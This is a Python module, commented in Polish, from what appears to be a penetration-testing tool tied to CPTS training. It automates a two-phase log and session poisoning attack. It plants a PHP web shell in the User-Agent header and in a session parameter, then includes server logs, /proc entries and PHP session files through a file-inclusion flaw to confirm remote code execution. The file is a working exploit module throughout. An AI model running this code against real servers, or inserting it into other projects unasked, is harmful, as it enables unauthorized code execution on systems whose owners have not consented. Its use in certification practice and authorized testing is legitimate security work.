"""Log / session poisoning — dwufazowa technika RCE z CPTS.

Faza INJECT: wysyłamy żądanie z web-shellem w polu, które trafia do logu
             (User-Agent -> access.log) lub do pliku sesji (?param -> sess_*).
Faza INCLUDE: dołączamy ten log/sesję przez LFI i wywołujemy kod (marker).

Wymaga, by aplikacja miała prawo odczytu danego logu (zależne od serwera).
"""
from __future__ import annotations

from collections.abc import Iterator

from ..config import Encoding
from ..detection import Finding, RCE_MARKER
from ..http_client import HttpClient
from .base import BaseModule

_WEBSHELL = f"<?php system('echo {RCE_MARKER}; id'); ?>"

# Kandydaci na logi do dołączenia (Linux + Windows z materiału).
_LOG_PATHS = [
    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
    "/var/log/httpd/access_log",
    "/var/log/sshd.log", "/var/log/auth.log",
    "/var/log/mail", "/var/log/vsftpd.log",
    "/proc/self/environ", "/proc/self/fd/8", "/proc/self/fd/9",
    "C:/xampp/apache/logs/access.log", "C:/nginx/log/access.log",
]

# Bazowe katalogi sesji PHP (nazwa pliku: sess_<PHPSESSID>).
_SESSION_DIRS = ["/var/lib/php/sessions/", "C:/Windows/Temp/"]


class LogPoisonModule(BaseModule):
    name = "log_poison"
    description = "Log/session poisoning — INJECT web-shell, potem INCLUDE (2 fazy)"

    def payloads(self) -> Iterator[str]:
        # Interfejs bazowy niewykorzystywany — mamy własne run() dwufazowe.
        yield from ()

    async def run(self, client: HttpClient) -> list[Finding]:
        findings: list[Finding] = []

        # --- FAZA INJECT: zatruj access.log przez nagłówek User-Agent ---
        await client.send(
            "/",  # dowolne żądanie; liczy się nagłówek trafiający do logu
            encoding=Encoding.NONE,
            extra_headers={"User-Agent": _WEBSHELL},
        )

        # --- FAZA INCLUDE: dołącz każdy kandydujący log i sprawdź marker ---
        for log in self._candidate_logs():
            resp = await client.send(log, encoding=Encoding.NONE)
            if self.cfg.verbose:
                print(f"    [{resp.status}] {resp.length:>7}B  include {log}")
            f = self.evaluate(resp)
            if f.confirmed:
                findings.append(f)

        # --- SESSION POISONING: zatruj ?param, potem dołącz plik sesji ---
        sessid = client.cfg.cookies.get("PHPSESSID")
        if sessid:
            await client.send(_WEBSHELL, encoding=Encoding.URL)  # zapisze się w sesji
            for d in _SESSION_DIRS:
                sess_path = f"{d}sess_{sessid}"
                resp = await client.send(sess_path, encoding=Encoding.NONE)
                if self.cfg.verbose:
                    print(f"    [{resp.status}] {resp.length:>7}B  include {sess_path}")
                f = self.evaluate(resp)
                if f.confirmed:
                    findings.append(f)

        return self.dedup(findings)

    def _candidate_logs(self) -> list[str]:
        if self.cfg.target_file:
            return [self.cfg.target_file]
        return _LOG_PATHS
